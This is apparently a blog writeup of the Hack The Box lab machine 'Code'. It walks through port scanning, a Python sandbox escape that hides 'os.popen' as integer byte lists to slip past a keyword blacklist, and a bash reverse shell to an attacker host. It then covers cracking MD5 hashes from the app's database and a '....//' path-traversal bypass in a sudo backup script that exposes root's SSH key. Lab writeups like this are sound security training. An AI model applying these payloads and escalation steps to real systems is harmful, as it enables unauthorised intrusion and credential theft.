---
title: HTB Code - Writeup
date: 2025-04-05 21:53:00 +0330
categories: [Writeup]
tags: []
description: My writeup of Code from Hack The Box 

---

![](assets/img/Code.png)

## - **Recon & Enum**
Starting with an Nmap scan as always
```
$ sudo nmap -sC -sV -oN code_nmap --min-rate=1000 10.10.11.62 -p-

Nmap scan report for 10.10.11.62
Host is up (0.47s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b5:b9:7c:c4:50:32:95:bc:c2:65:17:df:51:a2:7a:bd (RSA)
|   256 94:b5:25:54:9b:68:af:be:40:e1:1d:a8:6b:85:0d:01 (ECDSA)
|_  256 12:8c:dc:97:ad:86:00:b4:88:e2:29:cf:69:b5:65:96 (ED25519)
5000/tcp open  http    Gunicorn 20.0.4
|_http-server-header: gunicorn/20.0.4
|_http-title: Python Code Editor
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

On port 5000 there is a python editor sandbox, but we have to bypass some restrictions on keywords such as `import` so we can write arbitrary code. At first, I checked if the blacklist was actually in a list or tuple so we can empty it which did not work so I used a list of integers to represent bytes and `getaddr` to run the commands.
>you can get the list of ints of any string with `list(b'<str>')` inside python
{: .prompt-tip }

## - **Foothold**

![](assets/img/code_chr.png)
here I got the module `os` as it is blacklisted
![](assets/img/code_bypass.png)
and here I got to execute commands and also read the output.  
Now all we have to do is to get a reverse shell

```
op=[111,115]
sys=[115, 121, 115, 116, 101, 109]
pop=[112, 111, 112, 101, 110]
brd=[114, 101, 97, 100]

o=globals().get(bytes(op).decode())
s=bytes(locals().get("sys")).decode()
p=bytes(locals().get("pop")).decode()
b=bytes(locals().get("brd")).decode()

att = getattr(o,p)("bash -c 'bash -i >& /dev/tcp/*.*.*.*/8080 0>&1'")
#print(getattr(att,b)())
```

- `op`: the os module  
- `sys`: system attribute  
- `pop`: popen attribute  
- `brd`: read builtin function  

```
$ nc -nvlp 8080
listening on [any] 8080 ...
connect to [*.*.*.*] from (UNKNOWN) [10.10.11.62] 42172
bash: cannot set terminal process group (6456): Inappropriate ioctl for device
bash: no job control in this shell
app-production@code:~/app$
```

## - **User**

When I was checking the global variables in the editor, I noticed a `db` and inside it pointed to `/home/app-production/app/instance/database.db` and from it I got two hashes, one for user `development` and one for `martin`.  
I used hashcat to crack them and got the user.

```
$ hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
$ hashcat --show hash.txt -m 0                          
759b74ce43947f5f4c91aeddc3e5bad3:development
3de6f30c4a09c27fc71932bfc68474be:nafeelswordsmaster
```

```
$ ssh martin@10.10.11.62

martin@code:~$ id
uid=1000(martin) gid=1000(martin) groups=1000(martin)
```



## - **Root**

```
martin@code:~$ sudo -l
Matching Defaults entries for martin on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User martin may run the following commands on localhost:
    (ALL : ALL) NOPASSWD: /usr/bin/backy.sh
```
As you can see, we can run backy.sh as root. It is some sort of a backup script and we can change the path of backing up by altering `task.json` in the backups folder. The script only acceptes paths starting with either `/home` or `/var` and will remove `../` from them, so what if we add double dots before and a slash after that like this `....//` ?
```
martin@code:~/backups$ cat task.json 
{
  "destination": "/home/martin/backups/",
  "multiprocessing": true,
  "verbose_log": true,
  "directories_to_archive": [
    "/home/....//root"
  ],
  "exclude": []
}
```

you guessed it, we got the root folder
```
martin@code:~/backups$ sudo backy.sh task.json 
2025/07/26 21:03:11 üçÄ backy 1.2
2025/07/26 21:03:11 üìã Working with task.json ...
2025/07/26 21:03:11 üí§ Nothing to sync
2025/07/26 21:03:11 üì§ Archiving: [/home/../root]
2025/07/26 21:03:11 üì• To: /home/martin/backups ...
2025/07/26 21:03:11 üì¶
tar: Removing leading `/home/../' from member names
/home/../root/
/home/../root/.local/
/home/../root/.local/share/
/home/../root/.local/share/nano/
/home/../root/.local/share/nano/search_history
/home/../root/.selected_editor
/home/../root/.sqlite_history
/home/../root/.profile
/home/../root/scripts/
/home/../root/scripts/cleanup.sh
/home/../root/scripts/backups/
/home/../root/scripts/backups/task.json
/home/../root/scripts/backups/code_home_app-production_app_2024_August.tar.bz2
/home/../root/scripts/database.db
/home/../root/scripts/cleanup2.sh
/home/../root/.python_history
/home/../root/root.txt
/home/../root/.cache/
/home/../root/.cache/motd.legal-displayed
/home/../root/.ssh/
/home/../root/.ssh/id_rsa
/home/../root/.ssh/authorized_keys
/home/../root/.bash_history
/home/../root/.bashrc
```
Now, even though we got the flag, the most important part is to get the shell, to have FULL CONTROL!  
this machine did the job for us and put the id_rsa file right in the root directory.
```
$ ssh root@10.10.11.62 -i id_rsa

root@code:~# id
uid=0(root) gid=0(root) groups=0(root)	
root@code:~#
```
and DONE!

![](assets/img/code_congrats.png)
